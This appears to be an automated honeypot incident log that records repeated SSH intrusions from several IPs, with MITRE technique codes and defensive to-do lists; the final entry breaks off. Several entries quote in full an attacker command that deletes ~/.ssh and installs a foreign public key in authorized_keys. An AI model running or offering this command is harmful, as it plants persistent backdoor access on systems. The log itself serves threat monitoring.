### 🔴 HIGH · IR-bb0f58c0d2fe

| Field | Detail |
|---|---|
| **Source IP** | `43.163.127[.]183` |
| **First Seen** | 2026-04-14 17:50 |
| **Last Seen** | 2026-04-14 17:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:50:13` | `cowrie.session.connect` |
| `2026-04-14 17:50:13` | `cowrie.client.version` |
| `2026-04-14 17:50:13` | `cowrie.client.kex` |
| `2026-04-14 17:50:13` | `cowrie.login.success` |
| `2026-04-14 17:50:13` | `cowrie.session.params` |
| `2026-04-14 17:50:13` | `cowrie.command.input` |
| `2026-04-14 17:50:13` | `cowrie.command.failed` |
| `2026-04-14 17:50:13` | `cowrie.log.closed` |
| `2026-04-14 17:50:14` | `cowrie.session.params` |
| `2026-04-14 17:50:14` | `cowrie.command.input` |
| `2026-04-14 17:50:14` | `cowrie.session.file_download` |
| `2026-04-14 17:50:14` | `cowrie.log.closed` |
| `2026-04-14 17:50:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.163.127[.]183` to AbuseIPDB if not already reported
- [ ] Block `43.163.127[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8876bc8523a9

| Field | Detail |
|---|---|
| **Source IP** | `43.163.127[.]183` |
| **First Seen** | 2026-04-14 17:50 |
| **Last Seen** | 2026-04-14 17:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:50:15` | `cowrie.session.connect` |
| `2026-04-14 17:50:15` | `cowrie.client.version` |
| `2026-04-14 17:50:15` | `cowrie.client.kex` |
| `2026-04-14 17:50:16` | `cowrie.login.success` |
| `2026-04-14 17:50:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.163.127[.]183` to AbuseIPDB if not already reported
- [ ] Block `43.163.127[.]183` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4c232d9015f

| Field | Detail |
|---|---|
| **Source IP** | `38.19.156[.]18` |
| **First Seen** | 2026-04-14 17:50 |
| **Last Seen** | 2026-04-14 17:51 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:50:55` | `cowrie.session.connect` |
| `2026-04-14 17:50:55` | `cowrie.client.version` |
| `2026-04-14 17:50:56` | `cowrie.client.kex` |
| `2026-04-14 17:50:57` | `cowrie.login.success` |
| `2026-04-14 17:50:57` | `cowrie.session.params` |
| `2026-04-14 17:50:57` | `cowrie.command.input` |
| `2026-04-14 17:50:57` | `cowrie.command.failed` |
| `2026-04-14 17:50:58` | `cowrie.log.closed` |
| `2026-04-14 17:50:59` | `cowrie.session.params` |
| `2026-04-14 17:50:59` | `cowrie.command.input` |
| `2026-04-14 17:50:59` | `cowrie.session.file_download` |
| `2026-04-14 17:50:59` | `cowrie.log.closed` |
| `2026-04-14 17:51:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.19.156[.]18` to AbuseIPDB if not already reported
- [ ] Block `38.19.156[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98b75bcd99dc

| Field | Detail |
|---|---|
| **Source IP** | `38.19.156[.]18` |
| **First Seen** | 2026-04-14 17:51 |
| **Last Seen** | 2026-04-14 17:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:51:02` | `cowrie.session.connect` |
| `2026-04-14 17:51:02` | `cowrie.client.version` |
| `2026-04-14 17:51:03` | `cowrie.client.kex` |
| `2026-04-14 17:51:04` | `cowrie.login.success` |
| `2026-04-14 17:51:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.19.156[.]18` to AbuseIPDB if not already reported
- [ ] Block `38.19.156[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9eb5f787b21e

| Field | Detail |
|---|---|
| **Source IP** | `103.146.159[.]14` |
| **First Seen** | 2026-04-14 17:51 |
| **Last Seen** | 2026-04-14 17:51 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:51:11` | `cowrie.session.connect` |
| `2026-04-14 17:51:11` | `cowrie.client.version` |
| `2026-04-14 17:51:12` | `cowrie.client.kex` |
| `2026-04-14 17:51:12` | `cowrie.login.success` |
| `2026-04-14 17:51:12` | `cowrie.session.params` |
| `2026-04-14 17:51:12` | `cowrie.command.input` |
| `2026-04-14 17:51:12` | `cowrie.command.failed` |
| `2026-04-14 17:51:12` | `cowrie.log.closed` |
| `2026-04-14 17:51:13` | `cowrie.session.params` |
| `2026-04-14 17:51:13` | `cowrie.command.input` |
| `2026-04-14 17:51:13` | `cowrie.session.file_download` |
| `2026-04-14 17:51:13` | `cowrie.log.closed` |
| `2026-04-14 17:51:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.146.159[.]14` to AbuseIPDB if not already reported
- [ ] Block `103.146.159[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78dba1bdfb5b

| Field | Detail |
|---|---|
| **Source IP** | `103.146.159[.]14` |
| **First Seen** | 2026-04-14 17:51 |
| **Last Seen** | 2026-04-14 17:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:51:15` | `cowrie.session.connect` |
| `2026-04-14 17:51:15` | `cowrie.client.version` |
| `2026-04-14 17:51:15` | `cowrie.client.kex` |
| `2026-04-14 17:51:15` | `cowrie.login.success` |
| `2026-04-14 17:51:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.146.159[.]14` to AbuseIPDB if not already reported
- [ ] Block `103.146.159[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24f16b49adaf

| Field | Detail |
|---|---|
| **Source IP** | `118.193.33[.]228` |
| **First Seen** | 2026-04-14 17:51 |
| **Last Seen** | 2026-04-14 17:51 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:51:30` | `cowrie.session.connect` |
| `2026-04-14 17:51:30` | `cowrie.client.version` |
| `2026-04-14 17:51:30` | `cowrie.client.kex` |
| `2026-04-14 17:51:30` | `cowrie.login.success` |
| `2026-04-14 17:51:30` | `cowrie.session.params` |
| `2026-04-14 17:51:30` | `cowrie.command.input` |
| `2026-04-14 17:51:30` | `cowrie.command.failed` |
| `2026-04-14 17:51:31` | `cowrie.log.closed` |
| `2026-04-14 17:51:31` | `cowrie.session.params` |
| `2026-04-14 17:51:31` | `cowrie.command.input` |
| `2026-04-14 17:51:31` | `cowrie.session.file_download` |
| `2026-04-14 17:51:31` | `cowrie.log.closed` |
| `2026-04-14 17:51:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.33[.]228` to AbuseIPDB if not already reported
- [ ] Block `118.193.33[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3860bf4a67c0

| Field | Detail |
|---|---|
| **Source IP** | `118.193.33[.]228` |
| **First Seen** | 2026-04-14 17:51 |
| **Last Seen** | 2026-04-14 17:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:51:33` | `cowrie.session.connect` |
| `2026-04-14 17:51:33` | `cowrie.client.version` |
| `2026-04-14 17:51:33` | `cowrie.client.kex` |
| `2026-04-14 17:51:33` | `cowrie.login.success` |
| `2026-04-14 17:51:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.33[.]228` to AbuseIPDB if not already reported
- [ ] Block `118.193.33[.]228` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58c772074f9b

| Field | Detail |
|---|---|
| **Source IP** | `38.19.156[.]18` |
| **First Seen** | 2026-04-14 17:52 |
| **Last Seen** | 2026-04-14 17:52 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:52:46` | `cowrie.session.connect` |
| `2026-04-14 17:52:46` | `cowrie.client.version` |
| `2026-04-14 17:52:46` | `cowrie.client.kex` |
| `2026-04-14 17:52:47` | `cowrie.login.success` |
| `2026-04-14 17:52:48` | `cowrie.session.params` |
| `2026-04-14 17:52:48` | `cowrie.command.input` |
| `2026-04-14 17:52:48` | `cowrie.command.failed` |
| `2026-04-14 17:52:48` | `cowrie.log.closed` |
| `2026-04-14 17:52:49` | `cowrie.session.params` |
| `2026-04-14 17:52:49` | `cowrie.command.input` |
| `2026-04-14 17:52:49` | `cowrie.session.file_download` |
| `2026-04-14 17:52:49` | `cowrie.log.closed` |
| `2026-04-14 17:52:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.19.156[.]18` to AbuseIPDB if not already reported
- [ ] Block `38.19.156[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb4acc06e597

| Field | Detail |
|---|---|
| **Source IP** | `38.19.156[.]18` |
| **First Seen** | 2026-04-14 17:52 |
| **Last Seen** | 2026-04-14 17:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:52:53` | `cowrie.session.connect` |
| `2026-04-14 17:52:53` | `cowrie.client.version` |
| `2026-04-14 17:52:53` | `cowrie.client.kex` |
| `2026-04-14 17:52:54` | `cowrie.login.success` |
| `2026-04-14 17:52:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.19.156[.]18` to AbuseIPDB if not already reported
- [ ] Block `38.19.156[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67a0dd3b3cd3

| Field | Detail |
|---|---|
| **Source IP** | `103.23.198[.]86` |
| **First Seen** | 2026-04-14 17:53 |
| **Last Seen** | 2026-04-14 17:53 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:53:52` | `cowrie.session.connect` |
| `2026-04-14 17:53:52` | `cowrie.client.version` |
| `2026-04-14 17:53:52` | `cowrie.client.kex` |
| `2026-04-14 17:53:53` | `cowrie.login.success` |
| `2026-04-14 17:53:54` | `cowrie.session.params` |
| `2026-04-14 17:53:54` | `cowrie.command.input` |
| `2026-04-14 17:53:54` | `cowrie.command.failed` |
| `2026-04-14 17:53:54` | `cowrie.log.closed` |
| `2026-04-14 17:53:55` | `cowrie.session.params` |
| `2026-04-14 17:53:55` | `cowrie.command.input` |
| `2026-04-14 17:53:55` | `cowrie.session.file_download` |
| `2026-04-14 17:53:55` | `cowrie.log.closed` |
| `2026-04-14 17:53:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.23.198[.]86` to AbuseIPDB if not already reported
- [ ] Block `103.23.198[.]86` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c026c5ff9dba

| Field | Detail |
|---|---|
| **Source IP** | `103.23.198[.]86` |
| **First Seen** | 2026-04-14 17:53 |
| **Last Seen** | 2026-04-14 17:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:53:58` | `cowrie.session.connect` |
| `2026-04-14 17:53:58` | `cowrie.client.version` |
| `2026-04-14 17:53:58` | `cowrie.client.kex` |
| `2026-04-14 17:53:59` | `cowrie.login.success` |
| `2026-04-14 17:53:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.23.198[.]86` to AbuseIPDB if not already reported
- [ ] Block `103.23.198[.]86` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b37317afef3

| Field | Detail |
|---|---|
| **Source IP** | `118.193.33[.]228` |
| **First Seen** | 2026-04-14 17:54 |
| **Last Seen** | 2026-04-14 17:54 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:54:54` | `cowrie.session.connect` |
| `2026-04-14 17:54:54` | `cowrie.client.version` |
| `2026-04-14 17:54:54` | `cowrie.client.kex` |
| `2026-04-14 17:54:55` | `cowrie.login.success` |
| `2026-04-14 17:54:55` | `cowrie.session.params` |
| `2026-04-14 17:54:55` | `cowrie.command.input` |
| `2026-04-14 17:54:55` | `cowrie.command.failed` |
| `2026-04-14 17:54:55` | `cowrie.log.closed` |
| `2026-04-14 17:54:55` | `cowrie.session.params` |
| `2026-04-14 17:54:55` | `cowrie.command.input` |
| `2026-04-14 17:54:56` | `cowrie.session.file_download` |
| `2026-04-14 17:54:56` | `cowrie.log.closed` |
| `2026-04-14 17:54:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.33[.]228` to AbuseIPDB if not already reported
- [ ] Block `118.193.33[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3dd1ac3edd76

| Field | Detail |
|---|---|
| **Source IP** | `118.193.33[.]228` |
| **First Seen** | 2026-04-14 17:54 |
| **Last Seen** | 2026-04-14 17:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:54:57` | `cowrie.session.connect` |
| `2026-04-14 17:54:57` | `cowrie.client.version` |
| `2026-04-14 17:54:57` | `cowrie.client.kex` |
| `2026-04-14 17:54:58` | `cowrie.login.success` |
| `2026-04-14 17:54:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.33[.]228` to AbuseIPDB if not already reported
- [ ] Block `118.193.33[.]228` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5f7a2b06125

| Field | Detail |
|---|---|
| **Source IP** | `43.163.127[.]183` |
| **First Seen** | 2026-04-14 17:57 |
| **Last Seen** | 2026-04-14 17:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:57:04` | `cowrie.session.connect` |
| `2026-04-14 17:57:04` | `cowrie.client.version` |
| `2026-04-14 17:57:04` | `cowrie.client.kex` |
| `2026-04-14 17:57:04` | `cowrie.login.success` |
| `2026-04-14 17:57:04` | `cowrie.session.params` |
| `2026-04-14 17:57:04` | `cowrie.command.input` |
| `2026-04-14 17:57:04` | `cowrie.command.failed` |
| `2026-04-14 17:57:04` | `cowrie.log.closed` |
| `2026-04-14 17:57:05` | `cowrie.session.params` |
| `2026-04-14 17:57:05` | `cowrie.command.input` |
| `2026-04-14 17:57:05` | `cowrie.session.file_download` |
| `2026-04-14 17:57:05` | `cowrie.log.closed` |
| `2026-04-14 17:57:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.163.127[.]183` to AbuseIPDB if not already reported
- [ ] Block `43.163.127[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4713a0f1c203

| Field | Detail |
|---|---|
| **Source IP** | `43.163.127[.]183` |
| **First Seen** | 2026-04-14 17:57 |
| **Last Seen** | 2026-04-14 17:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:57:06` | `cowrie.session.connect` |
| `2026-04-14 17:57:06` | `cowrie.client.version` |
| `2026-04-14 17:57:06` | `cowrie.client.kex` |
| `2026-04-14 17:57:06` | `cowrie.login.success` |
| `2026-04-14 17:57:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.163.127[.]183` to AbuseIPDB if not already reported
- [ ] Block `43.163.127[.]183` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc1d0f4dd196

| Field | Detail |
|---|---|
| **Source IP** | `118.193.33[.]228` |
| **First Seen** | 2026-04-14 17:58 |
| **Last Seen** | 2026-04-14 17:58 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
